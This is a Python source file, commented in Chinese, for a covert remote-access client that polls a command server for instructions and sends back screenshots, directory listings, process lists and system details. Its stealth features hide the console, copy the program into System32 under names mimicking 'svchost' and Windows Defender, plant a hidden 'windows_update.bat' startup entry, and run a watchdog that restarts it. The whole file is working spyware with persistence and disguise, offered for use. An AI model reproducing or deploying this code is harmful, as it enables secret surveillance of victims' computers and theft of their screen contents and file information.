import os
import sys
import time
import json
import base64
import requests
import threading
import subprocess
from io import BytesIO
from datetime import datetime
import logging
import hashlib
import random

# 尝试导入可选依赖
try:
    import win32gui
    import win32con
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# 配置类
class ClientConfig:
    def __init__(self):
        self.server_url = "http://your-server-ip:5000"  # 修改为你的服务端地址
        self.client_id = self.generate_client_id()
        self.heartbeat_interval = 10  # 心跳间隔(秒)
        self.reconnect_delay = 30     # 重连延迟(秒)
        self.max_retries = 5          # 最大重试次数
        self.stealth_mode = True      # 隐身模式
        self.log_level = logging.INFO
        
    def generate_client_id(self):
        """生成客户端ID"""
        try:
            import socket
            hostname = socket.gethostname()
            return f"{hostname}_{hashlib.md5(hostname.encode()).hexdigest()[:8]}"
        except:
            return f"client_{random.randint(1000, 9999)}"

# 高级日志配置
class AdvancedLogger:
    def __init__(self, config):
        self.config = config
        self.setup_logging()
    
    def setup_logging(self):
        """设置日志"""
        log_dir = self.get_log_directory()
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, 'remote_client.log')
        
        # 创建logger
        logger = logging.getLogger()
        logger.setLevel(self.config.log_level)
        
        # 清除已有的handler
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        
        # 文件handler
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(self.config.log_level)
        
        # 控制台handler（仅在非隐身模式显示）
        if not self.config.stealth_mode:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(self.config.log_level)
        
        # 格式化
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        if not self.config.stealth_mode:
            console_handler.setFormatter(formatter)
        
        # 添加handler
        logger.addHandler(file_handler)
        if not self.config.stealth_mode:
            logger.addHandler(console_handler)
    
    def get_log_directory(self):
        """获取日志目录"""
        if self.config.stealth_mode:
            return os.path.join(
                os.environ.get('TEMP', ''),
                'Microsoft',
                'Windows',
                'Security'
            )
        else:
            return 'logs'

# 连接管理器
class ConnectionManager:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.connected = False
        self.retry_count = 0
        self.last_success = None
        
        # 设置会话参数
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def register(self):
        """注册到服务端"""
        try:
            response = self.session.post(
                f"{self.config.server_url}/api/register",
                json={
                    'client_id': self.config.client_id,
                    'hostname': self.get_hostname()
                },
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    self.connected = True
                    self.retry_count = 0
                    self.last_success = datetime.now()
                    return True
                else:
                    logging.error(f"注册失败: {data.get('message')}")
            elif response.status_code == 429:
                logging.warning("连接频率限制，等待后重试")
                time.sleep(60)
            elif response.status_code == 503:
                logging.warning("服务器资源不足，等待后重试")
                time.sleep(120)
            
        except requests.exceptions.RequestException as e:
            logging.error(f"网络错误: {e}")
        except Exception as e:
            logging.error(f"注册异常: {e}")
        
        self.connected = False
        self.retry_count += 1
        return False
    
    def send_heartbeat(self):
        """发送心跳"""
        try:
            response = self.session.post(
                f"{self.config.server_url}/api/heartbeat/{self.config.client_id}",
                json={'timestamp': datetime.now().isoformat()},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.last_success = datetime.now()
                return data.get('command')
            else:
                logging.warning(f"心跳失败: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            logging.error(f"心跳网络错误: {e}")
        except Exception as e:
            logging.error(f"心跳异常: {e}")
        
        self.connected = False
        return None
    
    def send_result(self, command, result):
        """发送命令执行结果"""
        try:
            self.session.post(
                f"{self.config.server_url}/api/result/{self.config.client_id}",
                json={
                    'command': command,
                    'result': result
                },
                timeout=10
            )
        except Exception as e:
            logging.error(f"发送结果失败: {e}")
    
    def get_hostname(self):
        """获取主机名"""
        try:
            import socket
            return socket.gethostname()
        except:
            return "Unknown"

# 命令执行器
class CommandExecutor:
    def __init__(self):
        self.supported_commands = {
            'screenshot': self.take_screenshot,
            'lock_screen': self.lock_screen,
            'list_files': self.list_files,
            'system_info': self.get_system_info,
            'process_list': self.get_process_list
        }
    
    def execute(self, command_data):
        """执行命令"""
        command = command_data.get('command')
        data = command_data.get('data', {})
        
        if command in self.supported_commands:
            try:
                result = self.supported_commands[command](data)
                return {
                    'status': 'success',
                    'command': command,
                    'data': result
                }
            except Exception as e:
                return {
                    'status': 'error',
                    'command': command,
                    'error': str(e)
                }
        else:
            return {
                'status': 'error',
                'command': command,
                'error': f'不支持的命令: {command}'
            }
    
    def take_screenshot(self, data):
        """截取屏幕"""
        if not HAS_PIL:
            return {'error': 'PIL库不可用'}
        
        try:
            # 降低截屏质量以减少数据传输
            quality = data.get('quality', 30)
            
            screenshot = ImageGrab.grab()
            buffer = BytesIO()
            screenshot.save(buffer, format='JPEG', quality=quality)
            screenshot_data = base64.b64encode(buffer.getvalue()).decode()
            
            return {'screenshot': screenshot_data}
            
        except Exception as e:
            return {'error': f'截屏失败: {str(e)}'}
    
    def lock_screen(self, data):
        """锁屏"""
        try:
            if HAS_WIN32:
                subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], 
                             capture_output=True, timeout=5)
                return {'status': 'locked'}
            else:
                return {'error': '不支持锁屏功能'}
        except Exception as e:
            return {'error': f'锁屏失败: {str(e)}'}
    
    def list_files(self, data):
        """列出文件"""
        path = data.get('path', 'C:\\')
        
        try:
            if not os.path.exists(path):
                return {'error': '路径不存在'}
            
            files = []
            for item in os.listdir(path):
                try:
                    item_path = os.path.join(path, item)
                    stat = os.stat(item_path)
                    
                    files.append({
                        'name': item,
                        'type': 'directory' if os.path.isdir(item_path) else 'file',
                        'size': stat.st_size if os.path.isfile(item_path) else 0,
                        'modified': stat.st_mtime
                    })
                except:
                    continue  # 跳过无法访问的文件
            
            return {
                'path': path,
                'files': files[:100]  # 限制返回数量
            }
            
        except Exception as e:
            return {'error': f'列出文件失败: {str(e)}'}
    
    def get_system_info(self, data):
        """获取系统信息"""
        info = {}
        
        try:
            import platform
            info['hostname'] = platform.node()
            info['os'] = f"{platform.system()} {platform.release()}"
            info['architecture'] = platform.architecture()[0]
            
            if HAS_PSUTIL:
                info['cpu_percent'] = psutil.cpu_percent(interval=1)
                info['memory_percent'] = psutil.virtual_memory().percent
                info['boot_time'] = psutil.boot_time()
            
        except Exception as e:
            info['error'] = str(e)
        
        return info
    
    def get_process_list(self, data):
        """获取进程列表"""
        if not HAS_PSUTIL:
            return {'error': 'psutil不可用'}
        
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except psutil.NoSuchProcess:
                    continue
            
            return {'processes': processes[:50]}  # 限制返回数量
            
        except Exception as e:
            return {'error': f'获取进程列表失败: {str(e)}'}

# 隐身管理器
class StealthManager:
    def __init__(self, config):
        self.config = config
        self.hidden = False
    
    def hide_console(self):
        """隐藏控制台"""
        if not self.config.stealth_mode or not HAS_WIN32:
            return
        
        try:
            window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(window, win32con.SW_HIDE)
            self.hidden = True
        except Exception as e:
            logging.warning(f"隐藏控制台失败: {e}")
    
    def move_to_hidden_location(self):
        """移动到隐藏位置"""
        if not self.config.stealth_mode:
            return False
        
        try:
            # 使用系统目录
            hidden_dir = os.path.join(
                os.environ.get('SystemRoot', 'C:\\Windows'),
                'System32',
                'config',
                'systemprofile',
                'AppData',
                'Local',
                'Microsoft',
                'WindowsApps'
            )
            os.makedirs(hidden_dir, exist_ok=True)
            
            current_file = os.path.abspath(sys.argv[0])
            target_file = os.path.join(hidden_dir, "svchost_helper.exe")
            
            # 如果不在目标位置，则复制并重启
            if not os.path.samefile(current_file, target_file):
                import shutil
                shutil.copy2(current_file, target_file)
                
                # 启动新实例
                subprocess.Popen(
                    [target_file],
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
                return True
                
        except Exception as e:
            logging.error(f"移动文件失败: {e}")
        
        return False
    
    def add_to_startup(self):
        """添加到开机启动"""
        if not self.config.stealth_mode:
            return
        
        try:
            startup_path = os.path.join(
                os.environ.get('ProgramData', 'C:\\ProgramData'),
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'StartUp'
            )
            os.makedirs(startup_path, exist_ok=True)
            
            bat_file = os.path.join(startup_path, "windows_update.bat")
            current_file = os.path.abspath(sys.argv[0])
            
            bat_content = f'@echo off\nstart "" "{current_file}"'
            
            with open(bat_file, 'w') as f:
                f.write(bat_content)
            
            # 隐藏批处理文件
            subprocess.call(f'attrib +h +s "{bat_file}"', shell=True)
            
        except Exception as e:
            logging.error(f"添加开机启动失败: {e}")
    
    def create_watchdog(self):
        """创建进程保护"""
        if not self.config.stealth_mode:
            return
        
        try:
            watchdog_path = os.path.join(
                os.environ.get('SystemRoot', 'C:\\Windows'),
                'System32',
                'config',
                'systemprofile',
                'AppData',
                'Local',
                'Microsoft',
                'WindowsApps',
                'windows_defender.exe'
            )
            
            current_file = os.path.abspath(sys.argv[0])
            
            if not os.path.exists(watchdog_path):
                import shutil
                shutil.copy2(current_file, watchdog_path)
            
        except Exception as e:
            logging.error(f"创建进程保护失败: {e}")

# 主客户端类
class RemoteClient:
    def __init__(self):
        self.config = ClientConfig()
        self.logger = AdvancedLogger(self.config)
        self.connection = ConnectionManager(self.config)
        self.executor = CommandExecutor()
        self.stealth = StealthManager(self.config)
        
        self.running = True
        self.watchdog_thread = None
    
    def initialize(self):
        """初始化客户端"""
        logging.info("开始初始化远程客户端...")
        
        # 隐身设置
        if self.config.stealth_mode:
            self.stealth.hide_console()
            
            if self.stealth.move_to_hidden_location():
                logging.info("程序已移动到隐藏位置并重启")
                return False  # 需要重启
            
            self.stealth.add_to_startup()
            self.stealth.create_watchdog()
        
        logging.info(f"客户端ID: {self.config.client_id}")
        logging.info(f"服务端: {self.config.server_url}")
        
        return True
    
    def start_watchdog(self):
        """启动进程保护"""
        def watchdog_monitor():
            while self.running:
                time.sleep(30)
                try:
                    # 检查主进程是否在运行
                    current_process = os.path.basename(sys.argv[0])
                    
                    # 简单的进程检查
                    if not self.is_process_running(current_process):
                        logging.warning("主进程可能已退出，尝试重启...")
                        self.restart_self()
                        
                except Exception as e:
                    logging.error(f"看门狗监控错误: {e}")
        
        self.watchdog_thread = threading.Thread(target=watchdog_monitor, daemon=True)
        self.watchdog_thread.start()
    
    def is_process_running(self, process_name):
        """检查进程是否在运行"""
        try:
            result = subprocess.run(
                ['tasklist', '/fi', f'imagename eq {process_name}'],
                capture_output=True, text=True, timeout=10
            )
            return process_name.lower() in result.stdout.lower()
        except:
            return True  # 如果检查失败，假设进程在运行
    
    def restart_self(self):
        """重启自身"""
        try:
            current_file = os.path.abspath(sys.argv[0])
            subprocess.Popen(
                [current_file],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
        except Exception as e:
            logging.error(f"重启失败: {e}")
    
    def connect_to_server(self):
        """连接到服务端"""
        logging.info("正在连接到服务端...")
        
        while self.running and self.connection.retry_count < self.config.max_retries:
            if self.connection.register():
                logging.info("成功连接到服务端")
                return True
            
            delay = self.config.reconnect_delay * (2 ** self.connection.retry_count)
            logging.warning(f"连接失败，{delay}秒后重试...")
            time.sleep(delay)
        
        logging.error("达到最大重试次数，连接失败")
        return False
    
    def heartbeat_loop(self):
        """心跳循环"""
        while self.running and self.connection.connected:
            try:
                # 发送心跳并检查命令
                command = self.connection.send_heartbeat()
                
                if command:
                    logging.info(f"接收到命令: {command.get('command')}")
                    
                    # 执行命令
                    result = self.executor.execute(command)
                    
                    # 发送执行结果
                    self.connection.send_result(command, result)
                
                # 动态调整心跳间隔
                current_interval = self.config.heartbeat_interval
                if self.connection.retry_count > 0:
                    current_interval = min(current_interval * 2, 60)  # 最大60秒
                
                time.sleep(current_interval)
                
            except Exception as e:
                logging.error(f"心跳循环错误: {e}")
                self.connection.connected = False
                break
    
    def start(self):
        """启动客户端"""
        # 初始化
        if not self.initialize():
            return  # 需要重启
        
        # 启动进程保护
        if self.config.stealth_mode:
            self.start_watchdog()
        
        # 主循环
        while self.running:
            if self.connect_to_server():
                self.heartbeat_loop()
            
            # 连接断开后的处理
            if self.running:
                logging.info("连接断开，尝试重新连接...")
                time.sleep(self.config.reconnect_delay)
    
    def stop(self):
        """停止客户端"""
        self.running = False
        logging.info("客户端正在关闭...")

def main():
    # 创建客户端实例
    client = RemoteClient()
    
    try:
        # 启动客户端
        client.start()
    except KeyboardInterrupt:
        client.stop()
    except Exception as e:
        logging.error(f"客户端运行错误: {e}")
        client.stop()

if __name__ == '__main__':
    main()